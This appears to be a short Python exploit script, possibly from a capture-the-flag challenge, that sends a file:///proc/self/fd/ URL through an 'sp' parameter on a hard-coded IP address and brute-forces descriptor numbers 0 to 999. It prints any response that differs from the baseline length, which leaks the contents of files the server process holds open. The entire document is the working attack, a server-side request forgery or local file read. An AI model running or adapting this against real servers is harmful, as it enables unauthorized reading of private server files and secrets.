import requests


for i in range(1000):

    x = requests.get(f'http://47.128.224.61/?sp=file:///proc/self/fd/{i}')
    print(i, len(x.text))
    if len(x.text) != 1670:
        print(x.text)
